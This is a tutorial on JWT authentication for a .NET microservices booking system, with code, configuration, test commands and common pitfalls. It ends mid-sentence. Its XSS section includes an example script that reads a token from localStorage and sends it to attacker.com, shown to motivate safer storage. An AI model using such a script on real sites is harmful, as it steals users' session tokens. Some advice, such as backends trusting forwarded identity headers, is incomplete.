# JWT Authentication - Deep Dive

## Table of Contents
- [What is JWT?](#what-is-jwt)
- [Why JWT for Microservices?](#why-jwt-for-microservices)
- [JWT Structure](#jwt-structure)
- [How JWT Works](#how-jwt-works)
- [Token Generation (UserService)](#token-generation-userservice)
- [Token Validation (API Gateway)](#token-validation-api-gateway)
- [JWT Claims](#jwt-claims)
- [Security Considerations](#security-considerations)
- [Testing JWT Authentication](#testing-jwt-authentication)
- [Common Pitfalls](#common-pitfalls)
- [Best Practices](#best-practices)
- [Interview Questions](#interview-questions)

---

## What is JWT?

**JWT (JSON Web Token)** is an **open standard (RFC 7519)** for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is **digitally signed**.

### Simple Analogy
Think of JWT like a **concert wristband**:
- When you enter the venue (login), security checks your ticket and gives you a wristband (JWT)
- The wristband has your access level stamped on it (claims)
- Security can verify the wristband is authentic by checking the stamp (signature)
- You show the wristband at bars, stages, VIP areas (API requests)
- No need to check your ticket again - the wristband proves your identity

### Key Characteristics
```
✅ Self-contained: Contains all user information needed
✅ Stateless: Server doesn't need to store session data
✅ Compact: Small size, easy to transmit in HTTP headers
✅ Verifiable: Digitally signed to prevent tampering
✅ Standardized: Works across different systems and languages
```

---

## Why JWT for Microservices?

### Problem: Session-Based Authentication in Microservices

**Traditional approach (Session Cookies):**
```
┌──────────┐         ┌─────────┐         ┌─────────────┐
│  Client  │────────>│ Service │────────>│   Session   │
│          │  Login  │    A    │  Query  │   Storage   │
└──────────┘         └─────────┘         │   (Redis)   │
                          │               └─────────────┘
                          │                      ▲
                          ▼                      │
                     ┌─────────┐                 │
                     │ Service │─────────────────┘
                     │    B    │    Query session
                     └─────────┘

❌ Problems:
- Every service must query session storage
- Creates coupling between services
- Session storage becomes single point of failure
- Adds latency to every request
- Doesn't scale well horizontally
```

**JWT approach:**
```
┌──────────┐         ┌─────────┐         ┌─────────────┐
│  Client  │────────>│ Service │         │ NO SESSION  │
│          │  Login  │    A    │         │   STORAGE   │
└──────────┘         └─────────┘         │   NEEDED!   │
     │                    │               └─────────────┘
     │ Receives JWT       │
     │                    │
     ▼                    ▼
┌──────────┐         ┌─────────┐
│  Client  │────────>│ Service │
│ + JWT    │ Request │    B    │
└──────────┘         └─────────┘
                          │
                     Validates JWT locally
                     (no external call needed)

✅ Benefits:
- Services validate JWT independently
- No shared session storage needed
- Services remain decoupled
- Better scalability and performance
- Works across service boundaries
```

### Benefits in Our Booking System

```
1. API Gateway validates JWT once
   ↓
2. Extracts user info (ID, email, username)
   ↓
3. Forwards to BookingService, PaymentService
   ↓
4. Services trust the gateway (no re-validation needed)
   ↓
5. Services use user info for authorization
```

**Result:** Fast, scalable, secure authentication across all microservices!

---

## JWT Structure

JWT consists of three parts separated by dots (`.`):

```
header.payload.signature
```

### 1. Header
Contains token metadata:
```json
{
  "alg": "HS256",     // Signing algorithm (HMAC SHA256)
  "typ": "JWT"        // Token type
}
```
**Base64Url encoded:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

### 2. Payload
Contains claims (user information):
```json
{
  "sub": "3fa85f64-5717-4562-b3fc-2c963f66afa6",  // Subject (User ID)
  "unique_name": "john_doe",                       // Username
  "email": "john@example.com",                     // Email
  "jti": "7c9e6679-7425-40de-944b-e07fc1f90ae7",  // JWT ID
  "iat": 1699564800,                               // Issued At (Unix timestamp)
  "exp": 1699568400                                // Expiration (Unix timestamp)
}
```
**Base64Url encoded:** `eyJzdWIiOiIzZmE4NWY2NC01NzE3LTQ1NjItYjNmYy0yYzk2M2Y2NmFmYTYiLCJ1bmlxdWVfbmFtZSI6ImpvaG5fZG9lIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwianRpIjoiN2M5ZTY2NzktNzQyNS00MGRlLTk0NGItZTA3ZmMxZjkwYWU3IiwiaWF0IjoxNjk5NTY0ODAwLCJleHAiOjE2OTk1Njg0MDB9`

### 3. Signature
Ensures token hasn't been tampered with:
```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```
**Result:** `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

### Complete JWT Example
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIzZmE4NWY2NC01NzE3LTQ1NjItYjNmYy0yYzk2M2Y2NmFmYTYiLCJ1bmlxdWVfbmFtZSI6ImpvaG5fZG9lIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwianRpIjoiN2M5ZTY2NzktNzQyNS00MGRlLTk0NGItZTA3ZmMxZjkwYWU3IiwiaWF0IjoxNjk5NTY0ODAwLCJleHAiOjE2OTk1Njg0MDB9
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Decoding JWTs

**Important:** JWT is **encoded**, not **encrypted**!

```
❌ Encryption: Data is scrambled and unreadable
✅ Encoding: Data is readable but signed to prevent tampering

Anyone can decode the payload:
- Go to https://jwt.io
- Paste your JWT
- See all claims (but can't modify without breaking signature)
```

**Implication:** Never store sensitive data in JWT payload (passwords, credit card numbers, etc.)

---

## How JWT Works

### Complete Authentication Flow

```
┌────────────┐                ┌──────────────┐                ┌─────────────┐
│   Client   │                │ API Gateway  │                │ UserService │
└─────┬──────┘                └──────┬───────┘                └──────┬──────┘
      │                              │                               │
      │ 1. POST /api/users/login     │                               │
      │    { username, password }    │                               │
      ├─────────────────────────────>│                               │
      │                              │                               │
      │                              │ 2. Forward login request      │
      │                              ├──────────────────────────────>│
      │                              │                               │
      │                              │                        3. Validate credentials
      │                              │                           - Check username exists
      │                              │                           - Verify password hash
      │                              │                               │
      │                              │                        4. Generate JWT
      │                              │                           - Create claims (sub, email, etc)
      │                              │                           - Sign with secret key
      │                              │                           - Set expiration (60 min)
      │                              │                               │
      │                              │ 5. Return JWT token           │
      │ 6. Send JWT to client        │<──────────────────────────────┤
      │<─────────────────────────────┤                               │
      │ { "token": "eyJhbG..." }     │                               │
      │                              │                               │
      │                              │                               │
      │ 7. GET /api/bookings         │                               │
      │    Authorization: Bearer     │                               │
      │    eyJhbG...                 │                               │
      ├─────────────────────────────>│                               │
      │                              │                               │
      │                       8. Validate JWT                         │
      │                          - Check signature                    │
      │                          - Verify issuer/audience             │
      │                          - Check expiration                   │
      │                          - Extract claims                     │
      │                              │                               │
      │                       9. Forward request with claims          │
      │                              │      X-User-Id: 3fa85f64...    │
      │                              │      X-User-Name: john_doe     │
      │                              ├──────────────────────────────> BookingService
      │                              │                               │
      │                              │ 10. Return bookings           │
      │ 11. Response                 │<──────────────────────────────┤
      │<─────────────────────────────┤                               │
      │                              │                               │
```

### Step-by-Step Breakdown

**PHASE 1: Login and Token Generation**

```
Client sends credentials:
POST /api/users/login
{
  "username": "john_doe",
  "password": "SecurePass123!"
}

UserService validates:
1. Lookup user by username in database
2. Compare password hash using bcrypt:
   - Stored: $2a$11$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
   - Input:  "SecurePass123!"
   - Match: ✅
3. If valid, generate JWT

UserService returns:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
    "username": "john_doe",
    "email": "john@example.com"
  }
}
```

**PHASE 2: Using JWT for Protected Requests**

```
Client includes JWT in Authorization header:
GET /api/bookings
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

API Gateway validates:
1. Extract token from Authorization header
2. Verify signature matches secret key
3. Check issuer = "UserService"
4. Check audience = "BookingSystem"
5. Check expiration > current time
6. Extract claims: sub, unique_name, email

If valid:
- Add X-User-Id: 3fa85f64-5717-4562-b3fc-2c963f66afa6 header
- Add X-User-Name: john_doe header
- Add X-User-Email: john@example.com header
- Forward to BookingService

BookingService receives:
GET /api/bookings
X-User-Id: 3fa85f64-5717-4562-b3fc-2c963f66afa6
X-User-Name: john_doe
X-User-Email: john@example.com
(no JWT needed - trusts gateway)

BookingService returns bookings for user ID 3fa85f64...
```

---

## Token Generation (UserService)

### Implementation Code

**Location:** `src/UserService/Services/AuthService.cs`

```csharp
private string GenerateJwtToken(User user)
{
    // 1. Load JWT configuration
    var jwtSettings = _configuration.GetSection("JwtSettings");
    var secretKey = jwtSettings["SecretKey"];      // From environment variable
    var issuer = jwtSettings["Issuer"];            // "UserService"
    var audience = jwtSettings["Audience"];        // "BookingSystem"
    var expirationMinutes = int.Parse(jwtSettings["ExpirationMinutes"] ?? "60");

    // 2. Create signing credentials
    var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
    var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

    // 3. Define claims (user information)
    var claims = new[]
    {
        new Claim(JwtRegisteredClaimNames.Sub, user.Id.ToString()),        // Subject: User ID
        new Claim(JwtRegisteredClaimNames.UniqueName, user.Username),      // Username
        new Claim(JwtRegisteredClaimNames.Email, user.Email),              // Email
        new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())  // JWT ID (unique token identifier)
    };

    // 4. Create JWT token
    var token = new JwtSecurityToken(
        issuer: issuer,                                    // Who issued the token
        audience: audience,                                // Who can use the token
        claims: claims,                                    // User information
        expires: DateTime.UtcNow.AddMinutes(expirationMinutes),  // Token expiration (60 min)
        signingCredentials: credentials                    // How to sign the token
    );

    // 5. Serialize token to string
    return new JwtSecurityTokenHandler().WriteToken(token);
}
```

### Configuration

**Location:** `src/UserService/appsettings.json`

```json
{
  "JwtSettings": {
    "SecretKey": "${JWT_SECRET_KEY}",        // Environment variable
    "Issuer": "UserService",                 // Token issuer
    "Audience": "BookingSystem",             // Intended audience
    "ExpirationMinutes": 60                  // Token lifetime
  }
}
```

**Environment Variables** (`.env`):
```bash
JWT_SECRET_KEY=YourSuperSecretKeyThatShouldBeAtLeast32CharactersLong!
JWT_ISSUER=UserService
JWT_AUDIENCE=BookingSystem
```

### What Happens at Login

```
1. User submits credentials:
   POST /api/users/login
   { "username": "john_doe", "password": "SecurePass123!" }

2. AuthService.LoginAsync():
   - Lookup user in database by username
   - Verify password using bcrypt
   - If invalid: return 401 Unauthorized
   - If valid: proceed to generate JWT

3. Generate JWT:
   - Load JWT settings from configuration
   - Create claims with user info (ID, username, email)
   - Sign token with secret key using HMAC-SHA256
   - Set expiration to current time + 60 minutes

4. Return JWT to client:
   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user": { "id": "...", "username": "john_doe", ... }
   }

5. Client stores token (localStorage, sessionStorage, memory)

6. Client includes token in all subsequent requests:
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

## Token Validation (API Gateway)

### Implementation Code

**Location:** `src/ApiGateway/Program.cs`

```csharp
// 1. Load JWT configuration
var jwtSettings = builder.Configuration.GetSection("JwtSettings");
var secretKey = jwtSettings["SecretKey"];
var issuer = jwtSettings["Issuer"];
var audience = jwtSettings["Audience"];

// 2. Configure JWT Bearer authentication
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            // Validate the token issuer (who created it)
            ValidateIssuer = true,
            ValidIssuer = issuer,
            
            // Validate the token audience (who can use it)
            ValidateAudience = true,
            ValidAudience = audience,
            
            // Validate token hasn't expired
            ValidateLifetime = true,
            
            // Validate signature matches secret key
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey)),
            
            // No tolerance for expired tokens (strict)
            ClockSkew = TimeSpan.Zero
        };

        // Event handlers for logging and debugging
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = context =>
            {
                Log.Warning("JWT authentication failed: {Exception}", context.Exception.Message);
                return Task.CompletedTask;
            },
            OnTokenValidated = context =>
            {
                var userId = context.Principal?.FindFirst(JwtRegisteredClaimNames.Sub)?.Value;
                Log.Information("JWT validated successfully for user: {UserId}", userId);
                return Task.CompletedTask;
            },
            OnMessageReceived = context =>
            {
                var token = context.Token;
                if (!string.IsNullOrEmpty(token))
                {
                    Log.Debug("JWT token received in request");
                }
                return Task.CompletedTask;
            }
        };
    });

// 3. Configure authorization policies
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("authenticated", policy =>
    {
        policy.RequireAuthenticatedUser();  // User must have valid JWT
    });
});
```

### Validation Process

```
Request arrives at API Gateway:
GET /api/bookings
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

STEP 1: Extract Token
- Middleware extracts token from Authorization header
- Removes "Bearer " prefix
- Decodes Base64Url encoded parts

STEP 2: Validate Signature
- Decodes header and payload
- Recomputes signature using secret key
- Compares computed signature with token signature
- If mismatch: REJECT (401 Unauthorized)

STEP 3: Validate Issuer
- Check "iss" claim = "UserService"
- If mismatch: REJECT (401 Unauthorized)

STEP 4: Validate Audience
- Check "aud" claim = "BookingSystem"
- If mismatch: REJECT (401 Unauthorized)

STEP 5: Validate Expiration
- Get current time: 2024-11-12T14:30:00Z
- Check "exp" claim: 2024-11-12T15:00:00Z
- Calculate: exp > now?
- If expired: REJECT (401 Unauthorized)
- ClockSkew = TimeSpan.Zero (no tolerance!)

STEP 6: Extract Claims
- Parse payload JSON
- Extract claims:
  - sub: "3fa85f64-5717-4562-b3fc-2c963f66afa6"
  - unique_name: "john_doe"
  - email: "john@example.com"
  - jti: "7c9e6679-7425-40de-944b-e07fc1f90ae7"

STEP 7: Create ClaimsPrincipal
- Create HttpContext.User with claims
- Available in middleware/controllers via User property

STEP 8: Forward Claims (UserClaimsForwardingMiddleware)
- Add X-User-Id: 3fa85f64... header
- Add X-User-Name: john_doe header
- Add X-User-Email: john@example.com header

STEP 9: Route to Backend Service
- YARP forwards request with added headers
- Backend service receives authenticated context
```

### ClockSkew: Why TimeSpan.Zero?

```csharp
ClockSkew = TimeSpan.Zero  // No tolerance for expired tokens
```

**What is ClockSkew?**
- Accounts for time differences between servers
- Default: 5 minutes tolerance
- Example with default ClockSkew (5 min):
  - Token expires: 14:00:00
  - Current time: 14:03:00 (3 min past expiration)
  - Still accepted! (within 5 min tolerance)

**Why set to Zero?**
```
✅ Security: No window for using expired tokens
✅ Predictability: Token is valid until exact expiration time
✅ Clear behavior: No confusion about "is my token valid?"

❌ Risk: Clock sync issues between servers
   - Solution: Use NTP (Network Time Protocol) to sync clocks
   - Docker containers use host machine time (usually synced)
```

---

## JWT Claims

### Standard Claims (Registered)

Claims defined in the JWT specification:

| Claim | Name | Description | Example |
|-------|------|-------------|---------|
| `sub` | Subject | User identifier (primary key) | `"3fa85f64-5717-4562-b3fc-2c963f66afa6"` |
| `iss` | Issuer | Who created the token | `"UserService"` |
| `aud` | Audience | Who can use the token | `"BookingSystem"` |
| `exp` | Expiration | Token expiration timestamp | `1699568400` (Unix) |
| `iat` | Issued At | Token creation timestamp | `1699564800` (Unix) |
| `jti` | JWT ID | Unique token identifier | `"7c9e6679-7425-40de-944b-e07fc1f90ae7"` |
| `nbf` | Not Before | Token not valid before | `1699564800` (Unix) |

### Custom Claims (Our Implementation)

| Claim | Name | Description | Usage |
|-------|------|-------------|-------|
| `unique_name` | Unique Name | Username | Display user info |
| `email` | Email | User email address | Communication, display |

### Accessing Claims in Code

**In API Gateway (after validation):**
```csharp
public class SomeController : ControllerBase
{
    [HttpGet]
    [Authorize]  // Requires valid JWT
    public IActionResult GetUserInfo()
    {
        // Access claims from User property
        var userId = User.FindFirst(JwtRegisteredClaimNames.Sub)?.Value;
        var username = User.FindFirst(JwtRegisteredClaimNames.UniqueName)?.Value;
        var email = User.FindFirst(JwtRegisteredClaimNames.Email)?.Value;
        var jti = User.FindFirst(JwtRegisteredClaimNames.Jti)?.Value;
        
        // Check if user is authenticated
        if (!User.Identity.IsAuthenticated)
        {
            return Unauthorized();
        }
        
        return Ok(new { userId, username, email, jti });
    }
}
```

**In Backend Services (from forwarded headers):**
```csharp
public class BookingsController : ControllerBase
{
    [HttpGet]
    public IActionResult GetMyBookings()
    {
        // Read claims from headers (set by API Gateway)
        var userId = Request.Headers["X-User-Id"].FirstOrDefault();
        var username = Request.Headers["X-User-Name"].FirstOrDefault();
        var email = Request.Headers["X-User-Email"].FirstOrDefault();
        
        if (string.IsNullOrEmpty(userId))
        {
            return Unauthorized();
        }
        
        // Query bookings for this user
        var bookings = _bookingService.GetBookingsByUserId(Guid.Parse(userId));
        
        return Ok(bookings);
    }
}
```

### Why These Claims?

```
sub (Subject):
✅ Primary user identifier (immutable)
✅ Used for database queries
✅ Never changes even if username/email changes

unique_name (Username):
✅ Human-readable identifier
✅ Used for display purposes
✅ May change over time (user can update username)

email:
✅ Contact information
✅ Used for notifications
✅ May change over time (user can update email)

jti (JWT ID):
✅ Unique token identifier
✅ Used for token revocation (blacklist)
✅ Prevents token replay attacks
✅ Useful for audit logs

iat (Issued At):
✅ When token was created
✅ Used for audit logs
✅ Helps detect token age
```

---

## Security Considerations

### 1. Secret Key Management

**❌ NEVER do this:**
```csharp
var secretKey = "my-secret-key";  // Hardcoded - TERRIBLE!
```

**✅ Always do this:**
```csharp
var secretKey = Environment.GetEnvironmentVariable("JWT_SECRET_KEY");

if (string.IsNullOrEmpty(secretKey))
{
    throw new InvalidOperationException("JWT_SECRET_KEY environment variable not set");
}
```

**Secret Key Requirements:**
```
✅ Minimum 256 bits (32 characters)
✅ Random and unpredictable
✅ Stored in environment variables (not in code!)
✅ Different secrets for dev/staging/production
✅ Rotate keys periodically (every 90 days)
✅ Never commit to version control
```

**Generating a strong secret key:**
```powershell
# PowerShell
$bytes = [byte[]]::new(64)
[Security.Cryptography.RandomNumberGenerator]::Fill($bytes)
[Convert]::ToBase64String($bytes)

# Output: kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r
```

### 2. Token Expiration

**Why expire tokens?**
```
Scenario: User's JWT is stolen
- Without expiration: Token valid forever (permanent access)
- With expiration (60 min): Stolen token only valid for 1 hour

Balance security vs user experience:
- Too short (5 min): Users must re-login frequently (annoying)
- Too long (24 hours): Greater window for stolen token abuse
- Just right (60 min): Good balance
```

**Refresh token pattern:**
```
Access Token (JWT):
- Short expiration (15-60 minutes)
- Used for API requests
- Stored in memory (not localStorage)

Refresh Token:
- Long expiration (7-30 days)
- Used to obtain new access tokens
- Stored in httpOnly cookie (XSS protection)
- Can be revoked in database

Flow:
1. Login → Receive access token + refresh token
2. Use access token for API requests
3. Access token expires after 60 min
4. Use refresh token to get new access token
5. Continue using new access token
6. If refresh token expires or revoked → Force re-login
```

**Our implementation (simplified):**
```
✅ Single JWT with 60-minute expiration
✅ User re-authenticates after expiration
❌ No refresh token (simpler for learning)

Production enhancement:
→ Add refresh token for better UX
```

### 3. HTTPS Only

**Why HTTPS is critical:**
```
HTTP (unencrypted):
┌────────┐                              ┌────────┐
│ Client │──────────────────────────────│ Server │
└────────┘   JWT visible to attacker!   └────────┘
              ▲
              │
         ┌─────────┐
         │ Hacker  │ <-- Sees JWT in plain text!
         └─────────┘

HTTPS (encrypted):
┌────────┐                              ┌────────┐
│ Client │══════════════════════════════│ Server │
└────────┘   Encrypted TLS tunnel       └────────┘
              ▲
              │
         ┌─────────┐
         │ Hacker  │ <-- Only sees encrypted gibberish
         └─────────┘
```

**Always enforce HTTPS:**
```csharp
// Redirect HTTP to HTTPS
app.UseHttpsRedirection();

// Require HTTPS
builder.Services.AddHsts(options =>
{
    options.MaxAge = TimeSpan.FromDays(365);
    options.IncludeSubDomains = true;
    options.Preload = true;
});
```

### 4. Token Storage (Client-Side)

**Storage options:**

| Storage | XSS Vulnerable | CSRF Vulnerable | Expires on Close | Best For |
|---------|----------------|-----------------|------------------|----------|
| localStorage | ✅ Yes | ❌ No | ❌ No | Simple apps |
| sessionStorage | ✅ Yes | ❌ No | ✅ Yes | Better security |
| Memory (variable) | ❌ No | ❌ No | ✅ Yes | Highest security |
| httpOnly Cookie | ❌ No | ✅ Yes | ❌ No | With CSRF protection |

**Best practice:**
```javascript
// Option 1: Memory storage (most secure)
let jwtToken = null;

async function login(username, password) {
  const response = await fetch('/api/users/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  
  const data = await response.json();
  jwtToken = data.token;  // Store in memory
  
  // Lost on page refresh → User must re-login
}

function makeAuthenticatedRequest() {
  return fetch('/api/bookings', {
    headers: {
      'Authorization': `Bearer ${jwtToken}`
    }
  });
}

// Option 2: sessionStorage (good balance)
sessionStorage.setItem('jwt', data.token);
const token = sessionStorage.getItem('jwt');

// Option 3: httpOnly cookie (requires server-side changes)
// Server sets cookie, browser automatically sends it
// Protects against XSS, requires CSRF protection
```

### 5. Never Store Sensitive Data in JWT

**❌ Bad JWT payload:**
```json
{
  "sub": "123",
  "username": "john_doe",
  "email": "john@example.com",
  "password": "SecurePass123!",        // NEVER!
  "creditCard": "4532-1234-5678-9012", // NEVER!
  "ssn": "123-45-6789"                 // NEVER!
}
```

**✅ Good JWT payload:**
```json
{
  "sub": "3fa85f64-5717-4562-b3fc-2c963f66afa6",  // User ID (GUID)
  "unique_name": "john_doe",                       // Username
  "email": "john@example.com",                     // Email
  "jti": "7c9e6679-7425-40de-944b-e07fc1f90ae7"   // Token ID
}
```

**Why?**
```
JWT is BASE64 ENCODED, not ENCRYPTED!

Anyone can decode the payload:
1. Go to https://jwt.io
2. Paste JWT
3. See all data in plain text

Signature prevents tampering, but NOT reading!
```

---

## Testing JWT Authentication

### Test Scenario 1: Successful Login

```bash
# Step 1: Login to get JWT
curl -X POST http://localhost:5001/api/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "john_doe",
    "password": "SecurePass123!"
  }'

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzZmE4NWY2NC01NzE3LTQ1NjItYjNmYy0yYzk2M2Y2NmFmYTYiLCJ1bmlxdWVfbmFtZSI6ImpvaG5fZG9lIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwianRpIjoiN2M5ZTY2NzktNzQyNS00MGRlLTk0NGItZTA3ZmMxZjkwYWU3IiwiaWF0IjoxNjk5NTY0ODAwLCJleHAiOjE2OTk1Njg0MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
  "user": {
    "id": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
    "username": "john_doe",
    "email": "john@example.com",
    "firstName": "John",
    "lastName": "Doe"
  }
}

# Step 2: Use JWT to access protected endpoint
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

curl -X GET http://localhost:5000/api/bookings \
  -H "Authorization: Bearer $TOKEN"

# Response: (list of bookings)
[
  {
    "id": "abc123...",
    "userId": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
    "eventName": "Concert",
    "eventDate": "2024-12-01T19:00:00Z",
    "status": "Confirmed"
  }
]
```

### Test Scenario 2: Missing Token

```bash
# Request without Authorization header
curl -X GET http://localhost:5000/api/bookings

# Response: 401 Unauthorized
{
  "type": "https://tools.ietf.org/html/rfc7235#section-3.1",
  "title": "Unauthorized",
  "status": 401
}
```

### Test Scenario 3: Invalid Signature

```bash
# Tamper with JWT (change payload)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.TAMPERED_PAYLOAD.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

curl -X GET http://localhost:5000/api/bookings \
  -H "Authorization: Bearer $TOKEN"

# Response: 401 Unauthorized
# Log: JWT authentication failed: IDX10503: Signature validation failed
```

### Test Scenario 4: Expired Token

```bash
# Use token past expiration time (wait 61 minutes after login)
curl -X GET http://localhost:5000/api/bookings \
  -H "Authorization: Bearer $EXPIRED_TOKEN"

# Response: 401 Unauthorized
# Log: JWT authentication failed: IDX10223: Lifetime validation failed. The token is expired.
```

### Test Scenario 5: Wrong Issuer

```bash
# Generate JWT with issuer "HackerService" instead of "UserService"
# Signature is valid, but issuer check fails

curl -X GET http://localhost:5000/api/bookings \
  -H "Authorization: Bearer $WRONG_ISSUER_TOKEN"

# Response: 401 Unauthorized
# Log: JWT authentication failed: IDX10205: Issuer validation failed
```

### Postman Collection

```json
{
  "info": {
    "name": "JWT Authentication Tests"
  },
  "item": [
    {
      "name": "Login",
      "request": {
        "method": "POST",
        "url": "http://localhost:5001/api/users/login",
        "header": [
          { "key": "Content-Type", "value": "application/json" }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"username\": \"john_doe\",\n  \"password\": \"SecurePass123!\"\n}"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "exec": [
              "var jsonData = pm.response.json();",
              "pm.environment.set(\"jwt_token\", jsonData.token);"
            ]
          }
        }
      ]
    },
    {
      "name": "Get Bookings (Authenticated)",
      "request": {
        "method": "GET",
        "url": "http://localhost:5000/api/bookings",
        "header": [
          { "key": "Authorization", "value": "Bearer {{jwt_token}}" }
        ]
      }
    }
  ]
}
```

### Debugging JWT Issues

**Decode JWT locally:**
```powershell
# PowerShell function to decode JWT
function Decode-JWT {
    param($token)
    
    $parts = $token.Split('.')
    $payload = $parts[1]
    
    # Add padding if needed
    $padding = (4 - ($payload.Length % 4)) % 4
    $payload += '=' * $padding
    
    # Decode Base64Url to JSON
    $bytes = [Convert]::FromBase64String($payload.Replace('-', '+').Replace('_', '/'))
    $json = [System.Text.Encoding]::UTF8.GetString($bytes)
    
    return $json | ConvertFrom-Json
}

# Usage:
$token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
Decode-JWT $token

# Output:
# sub        : 3fa85f64-5717-4562-b3fc-2c963f66afa6
# unique_name: john_doe
# email      : john@example.com
# jti        : 7c9e6679-7425-40de-944b-e07fc1f90ae7
# iat        : 1699564800
# exp        : 1699568400
```

---

## Common Pitfalls

### 1. Expired Token (IDX10223)

**Error:**
```
IDX10223: Lifetime validation failed. The token is expired.
ValidTo: '2024-11-12T15:00:00Z'
Current time: '2024-11-12T15:30:00Z'
```

**Cause:** Token used after expiration (60 minutes)

**Solution:**
```
Option 1: Refresh token (re-login)
Option 2: Implement refresh token pattern
Option 3: Increase expiration time (less secure)
```

### 2. Wrong Secret Key (IDX10503)

**Error:**
```
IDX10503: Signature validation failed. Token signature does not match.
```

**Cause:** 
- Secret key mismatch between UserService and API Gateway
- Token generated with one key, validated with another

**Solution:**
```bash
# Ensure both services use same JWT_SECRET_KEY
# Check .env file:
JWT_SECRET_KEY=kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r

# Restart both services after changing
docker-compose restart userservice apigateway
```

### 3. Issuer Validation Failed (IDX10205)

**Error:**
```
IDX10205: Issuer validation failed.
Issuer: 'OtherService'
Valid issuers: 'UserService'
```

**Cause:** Issuer in token doesn't match expected issuer

**Solution:**
```json
// Ensure both services have matching configuration

// UserService appsettings.json
{
  "JwtSettings": {
    "Issuer": "UserService"
  }
}

// API Gateway appsettings.json
{
  "JwtSettings": {
    "Issuer": "UserService"  // Must match!
  }
}
```

### 4. Missing Authorization Header

**Error:** 401 Unauthorized (no specific message)

**Cause:** Forgot to include Authorization header

**Solution:**
```javascript
// ❌ Wrong
fetch('/api/bookings')

// ✅ Correct
fetch('/api/bookings', {
  headers: {
    'Authorization': `Bearer ${jwtToken}`
  }
})
```

### 5. ClockSkew Issues

**Scenario:**
```
Server time: 2024-11-12T15:00:00Z (UTC)
Client time: 2024-11-12T15:05:00Z (5 minutes ahead)

Token expires: 2024-11-12T15:00:00Z
Current time: 2024-11-12T15:00:05Z

With ClockSkew = TimeSpan.Zero:
→ Token rejected (expired by 5 seconds)

With ClockSkew = TimeSpan.FromMinutes(5) (default):
→ Token accepted (within 5-minute tolerance)
```

**Solution:**
```
Option 1: Sync server clocks using NTP
Option 2: Use default ClockSkew (5 minutes)
Option 3: Test with slightly longer expiration
```

### 6. XSS Attack (localStorage)

**Scenario:**
```javascript
// Vulnerable: JWT in localStorage
localStorage.setItem('jwt', token);

// Attacker injects malicious script
<script>
  const stolenToken = localStorage.getItem('jwt');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: stolenToken })
  });
</script>
```

**Solution:**
```javascript
// Option 1: Store in memory (lost on page refresh)
let jwtToken = null;

// Option 2: httpOnly cookie (requires server changes)
// Server sets cookie, browser sends automatically
// Protected from JavaScript access

// Option 3: Use Content Security Policy (CSP)
// Prevents inline scripts
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'">
```

---

## Best Practices

### 1. Use Environment Variables for Configuration

```bash
# .env file (never commit to Git!)
JWT_SECRET_KEY=kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r
JWT_ISSUER=UserService
JWT_AUDIENCE=BookingSystem
JWT_EXPIRATION_MINUTES=60
```

```csharp
// Load from environment
var secretKey = Environment.GetEnvironmentVariable("JWT_SECRET_KEY");

if (string.IsNullOrEmpty(secretKey))
{
    throw new InvalidOperationException("JWT_SECRET_KEY must be set");
}
```

### 2. Use Strong Secret Keys

```
Minimum: 256 bits (32 characters)
Recommended: 512 bits (64 characters)
Format: Random Base64 string

Generate:
